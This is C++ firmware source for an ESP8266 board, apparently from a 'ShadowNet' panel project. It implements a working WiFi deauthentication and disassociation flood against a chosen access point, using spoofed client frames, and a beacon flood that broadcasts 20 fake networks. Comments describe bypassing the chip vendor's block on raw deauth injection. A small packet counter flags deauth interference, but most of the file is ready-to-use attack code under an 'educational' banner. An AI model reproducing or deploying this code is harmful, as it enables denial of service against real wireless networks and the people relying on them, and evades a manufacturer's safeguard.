/*
 * wifi_attacks.cpp — WiFi deauthentication, beacon flood & monitoring
 *
 * ================================================================
 *  ⚠ EDUCATIONAL / DEFENSIVE RESEARCH USE ONLY
 *  Created by: Shawal Ahmad Mohmand
 * ================================================================
 */

#include "wifi_attacks.h"
#include <ESP8266WiFi.h>
#include "settings.h"
extern "C" {
  #include "user_interface.h"
}

// ── Deauth State ────────────────────────────────────────────────
static WifiAttackState _state = WATK_IDLE;
static uint8_t  _targetBSSID[6];
static uint8_t  _targetChannel = 1;
static uint32_t _frameCount = 0;
static unsigned long _lastBurst = 0;

// Packet counter (promiscuous mode)
static volatile uint32_t _pktCount = 0;
static volatile uint32_t _deauthPktCount = 0;
static unsigned long _pktCountStart = 0;

// ── Beacon Flood State ──────────────────────────────────────────
static bool _beaconRunning = false;
static uint32_t _beaconCount = 0;
static unsigned long _lastBeacon = 0;

// Fake AP names for beacon flood
static const char* _fakeSSIDs[] = {
  "Free WiFi", "Airport_WiFi", "Starbucks_Guest",
  "Hotel_Lobby", "FBI_Van_#3", "DefinitelyNotAVirus",
  "Loading...", "Connecting...", "Network_Error",
  "Government_Drone", "WiFi_Password_is_1234", "Drop_It_Like_Its_Hotspot",
  "TheLANBeforeTime", "Hide_Yo_WiFi", "Bill_Wi_The_Science_Fi",
  "Abraham_Linksys", "Wu_Tang_LAN", "Pretty_Fly_For_A_WiFi",
  "Silence_Of_The_LANs", "It_Burns_When_IP",
  "GetOffMyLAN", "The_Promised_LAN", "John_Wilkes_Bluetooth",
  "Nacho_WiFi", "No_Free_WiFi_Here", "NotYourWiFi",
  "PasswordIsTaco", "YellAtYourWiFi", "BringYourOwnWiFi",
  "CantHackThis"
};
static const uint8_t _fakeSSIDCount = 30;

struct FakeAP {
  const char* ssid;
  uint8_t bssid[6];
  uint8_t channel;
};

#define CONCURRENT_FAKE_APS 20
static FakeAP _activeFakeAPs[CONCURRENT_FAKE_APS];

/*
 * 802.11 deauthentication frame template (26 bytes)
 */
static uint8_t _deauthFrame[26] = {
  0xC0, 0x00,                         // Frame Control: Deauth
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: BSSID
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                         // Sequence number
  0x01, 0x00                          // Reason code: Unspecified
};

/*
 * 802.11 disassociation frame template (26 bytes)
 */
static uint8_t _disassocFrame[26] = {
  0xA0, 0x00,                         // Frame Control: Disassoc
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: BSSID
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                         // Sequence number
  0x07, 0x00                          // Reason code: Class 3 frame
};

/*
 * 802.11 Beacon frame template
 */
static uint8_t _beaconFrame[128];

static void _buildBeacon(const char* ssid, const uint8_t bssid[6], uint8_t channel) {
  memset(_beaconFrame, 0, sizeof(_beaconFrame));
  uint8_t ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  uint8_t i = 0;
  // Frame Control: Beacon
  _beaconFrame[i++] = 0x80; _beaconFrame[i++] = 0x00;
  // Duration
  _beaconFrame[i++] = 0x00; _beaconFrame[i++] = 0x00;
  // Destination: broadcast
  memset(&_beaconFrame[i], 0xFF, 6); i += 6;
  // Source: BSSID
  memcpy(&_beaconFrame[i], bssid, 6); i += 6;
  // BSSID
  memcpy(&_beaconFrame[i], bssid, 6); i += 6;
  // Sequence number
  _beaconFrame[i++] = 0x00; _beaconFrame[i++] = 0x00;
  // Timestamp (8 bytes, filled by hardware usually)
  uint32_t ts = micros();
  memcpy(&_beaconFrame[i], &ts, 4); i += 4;
  memset(&_beaconFrame[i], 0, 4); i += 4;
  // Beacon interval: 100 TU (0x0064)
  _beaconFrame[i++] = 0x64; _beaconFrame[i++] = 0x00;
  // Capabilities: ESS
  _beaconFrame[i++] = 0x01; _beaconFrame[i++] = 0x04;
  // SSID parameter set
  _beaconFrame[i++] = 0x00;        // Tag: SSID
  _beaconFrame[i++] = ssidLen;     // Length
  memcpy(&_beaconFrame[i], ssid, ssidLen); i += ssidLen;
  // Supported rates
  _beaconFrame[i++] = 0x01; // Tag: Supported Rates
  _beaconFrame[i++] = 0x08; // Length
  _beaconFrame[i++] = 0x82; // 1 Mbps (basic)
  _beaconFrame[i++] = 0x84; // 2 Mbps (basic)
  _beaconFrame[i++] = 0x8B; // 5.5 Mbps (basic)
  _beaconFrame[i++] = 0x96; // 11 Mbps (basic)
  _beaconFrame[i++] = 0x24; // 18 Mbps
  _beaconFrame[i++] = 0x30; // 24 Mbps
  _beaconFrame[i++] = 0x48; // 36 Mbps
  _beaconFrame[i++] = 0x6C; // 54 Mbps
  // DS Parameter Set (channel)
  _beaconFrame[i++] = 0x03; // Tag: DS Parameter Set
  _beaconFrame[i++] = 0x01; // Length
  _beaconFrame[i++] = channel;
}

// ── Promiscuous callback ────────────────────────────────────────
static void _promiscRxCb(uint8_t *buf, uint16_t len) {
  if (len < 13) return;
  _pktCount++;
  uint8_t frameType = buf[12];
  if (frameType == 0xC0 || frameType == 0xA0) {
    _deauthPktCount++;
  }
}

// ── Public API ──────────────────────────────────────────────────

void wifi_attacks_init() {
  // Disconnect from any STA network, but keep AP alive
  WiFi.disconnect();
  delay(10);
  DBGLN(F("[WATK] WiFi attacks subsystem initialized"));
}

/*
 * DEAUTH — Fixed version with disassoc + proper spoofed client
 */
void wifi_attacks_deauth_start(const uint8_t bssid[6], uint8_t channel) {
  memcpy(_targetBSSID, bssid, 6);
  _targetChannel = channel;
  _frameCount = 0;
  _lastBurst = 0;

  // CRITICAL SDK 3.x BYPASS:
  // Espressif explicitly blocks raw 0xC0 (Deauth) frame injections if the SoftAP
  // is active to prevent Rogue APs. We MUST temporarily drop to strictly STATION_MODE
  // in RAM (using _current to avoid EEPROM wear) to bypass the drop firewall.
  // This means the ShadowNet_Panel WILL temporarily disconnect during Deauth!
  wifi_set_opmode_current(STATION_MODE);
  delay(50);
  wifi_set_channel(_targetChannel);
  
  // ESP8266 REQUIRES promiscuous mode to inject raw frames reliably!
  wifi_promiscuous_enable(1);

  // Fill BSSID into deauth frame
  memcpy(&_deauthFrame[10], _targetBSSID, 6);  // Source
  memcpy(&_deauthFrame[16], _targetBSSID, 6);  // BSSID

  // Fill BSSID into disassoc frame
  memcpy(&_disassocFrame[10], _targetBSSID, 6);
  memcpy(&_disassocFrame[16], _targetBSSID, 6);

  _state = WATK_RUNNING;
  DBGF("[WATK] Deauth SDK Bypass activated on ch%d BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
       channel, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
}

void wifi_attacks_deauth_stop() {
  _state = WATK_STOPPED;
  // Make sure we stop promiscuous mode if beacon flood isn't running either
  if (!_beaconRunning) wifi_promiscuous_enable(0);
  
  // Restore AP mode to bring the ShadowNet_Panel back online
  wifi_set_opmode_current(STATIONAP_MODE);
  if (globalSettings.ap_on) {
    WiFi.softAP(globalSettings.ap_ssid, globalSettings.ap_pass, globalSettings.ap_channel);
  }

  DBGF("[WATK] Deauth stopped. SoftAP Restored. Total frames: %lu\n", _frameCount);
}

uint16_t wifi_attacks_update() {
  if (_state != WATK_RUNNING) return 0;

  unsigned long now = millis();
  if (now - _lastBurst < DEAUTH_BURST_INTERVAL_MS) return 0;
  _lastBurst = now;

  uint16_t sent = 0;
  
  // Deauth reason codes: 1=unspecified, 4=disassociated due to inactivity, 8=leaving BSS
  const uint8_t reasons[] = {1, 4, 8};

  for (uint16_t i = 0; i < DEAUTH_FRAME_COUNT; i++) {
    uint8_t rcode = reasons[i % 3];
    _deauthFrame[24] = rcode;
    
    // Update sequence number
    _deauthFrame[22] = (_frameCount & 0xFF);
    _deauthFrame[23] = ((_frameCount >> 8) & 0x0F);
    _disassocFrame[22] = _deauthFrame[22];
    _disassocFrame[23] = _deauthFrame[23];

    // === Frame 1: AP → broadcast (deauth all clients) ===
    _deauthFrame[4] = 0xFF; _deauthFrame[5] = 0xFF;
    _deauthFrame[6] = 0xFF; _deauthFrame[7] = 0xFF;
    _deauthFrame[8] = 0xFF; _deauthFrame[9] = 0xFF;
    wifi_send_pkt_freedom(_deauthFrame, sizeof(_deauthFrame), 0);
    sent++; _frameCount++;

    // === Frame 2: AP → broadcast (disassociation) ===
    _disassocFrame[4] = 0xFF; _disassocFrame[5] = 0xFF;
    _disassocFrame[6] = 0xFF; _disassocFrame[7] = 0xFF;
    _disassocFrame[8] = 0xFF; _disassocFrame[9] = 0xFF;
    wifi_send_pkt_freedom(_disassocFrame, sizeof(_disassocFrame), 0);
    sent++; _frameCount++;

    // === Frame 3: Spoofed client → AP (pretend client is leaving) ===
    // Random client MAC
    uint8_t fakeClient[6];
    fakeClient[0] = random(0x00, 0xFF) & 0xFE;  // Unicast
    fakeClient[1] = random(0x00, 0xFF);
    fakeClient[2] = random(0x00, 0xFF);
    fakeClient[3] = random(0x00, 0xFF);
    fakeClient[4] = random(0x00, 0xFF);
    fakeClient[5] = random(0x00, 0xFF);

    // Deauth: client→AP
    memcpy(&_deauthFrame[4], _targetBSSID, 6);    // Dest = AP
    memcpy(&_deauthFrame[10], fakeClient, 6);     // Src = fake client
    wifi_send_pkt_freedom(_deauthFrame, sizeof(_deauthFrame), 0);
    sent++; _frameCount++;

    // Restore broadcast template
    memset(&_deauthFrame[4], 0xFF, 6);
    memcpy(&_deauthFrame[10], _targetBSSID, 6);

    delayMicroseconds(DEAUTH_DELAY_MS * 100);
  }

  return sent;
}

WifiAttackState wifi_attacks_getState() {
  return _state;
}

uint32_t wifi_attacks_getFrameCount() {
  return _frameCount;
}

// ── Beacon Flood (Fake APs) ─────────────────────────────────────

void wifi_attacks_beacon_start() {
  _beaconRunning = true;
  _beaconCount = 0;
  _lastBeacon = 0;

  // ESP8266 REQUIRES promiscuous mode to inject raw frames reliably!
  wifi_promiscuous_enable(1);

  // Initialize 20 concurrent fake APs
  for (int i = 0; i < CONCURRENT_FAKE_APS; i++) {
    _activeFakeAPs[i].ssid = _fakeSSIDs[random(0, _fakeSSIDCount)];
    _activeFakeAPs[i].bssid[0] = random(0x00, 0xFF) & 0xFE;
    _activeFakeAPs[i].bssid[1] = random(0x00, 0xFF);
    _activeFakeAPs[i].bssid[2] = random(0x00, 0xFF);
    _activeFakeAPs[i].bssid[3] = random(0x00, 0xFF);
    _activeFakeAPs[i].bssid[4] = random(0x00, 0xFF);
    _activeFakeAPs[i].bssid[5] = random(0x00, 0xFF);
    _activeFakeAPs[i].channel = random(1, 12);
  }

  DBGLN(F("[WATK] Beacon flood started with 20 concurrent APs"));
}

void wifi_attacks_beacon_stop() {
  _beaconRunning = false;
  // Make sure we stop promiscuous mode if deauth isn't running either
  if (_state != WATK_RUNNING) wifi_promiscuous_enable(0);
  DBGF("[WATK] Beacon flood stopped. Total: %lu\n", _beaconCount);
}

void wifi_attacks_beacon_update() {
  if (!_beaconRunning) return;

  unsigned long now = millis();
  if (now - _lastBeacon < BEACON_INTERVAL_MS) return;
  _lastBeacon = now;

  for (uint8_t i = 0; i < CONCURRENT_FAKE_APS; i++) {
    _buildBeacon(_activeFakeAPs[i].ssid, _activeFakeAPs[i].bssid, _activeFakeAPs[i].channel);

    // Calculate actual frame length
    uint8_t ssidLen = strlen(_activeFakeAPs[i].ssid);
    if (ssidLen > 32) ssidLen = 32;
    uint8_t frameLen = 24 + 12 + 2 + ssidLen + 10 + 3; // header + fixed + ssid tag + rates + DS

    wifi_send_pkt_freedom(_beaconFrame, frameLen, 0);
    _beaconCount++;
    
    // We optionally change channel for beacons, but the SDK forces sending on the current channel.
    // It's fine to just spam them on the current channel. Most devices scan all channels.

    delayMicroseconds(400); // 0.4ms delay between beacons
  }
}

bool wifi_attacks_beacon_isRunning() {
  return _beaconRunning;
}

uint32_t wifi_attacks_beacon_getCount() {
  return _beaconCount;
}

// ── Packet Counter ──────────────────────────────────────────────

void wifi_attacks_startPacketCounter() {
  _pktCount = 0;
  _deauthPktCount = 0;
  _pktCountStart = millis();
  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(_promiscRxCb);
  DBGLN(F("[WATK] Packet counter started"));
}

void wifi_attacks_stopPacketCounter() {
  wifi_promiscuous_enable(0);
  DBGLN(F("[WATK] Packet counter stopped"));
}

uint32_t wifi_attacks_getPacketCount() {
  return _pktCount;
}

void wifi_attacks_resetPacketCount() {
  _pktCount = 0;
  _deauthPktCount = 0;
  _pktCountStart = millis();
}

bool wifi_attacks_detectInterference() {
  unsigned long elapsed = millis() - _pktCountStart;
  if (elapsed < 1000) return false;
  float rate = (float)_deauthPktCount / (elapsed / 1000.0);
  return rate > 10.0;
}
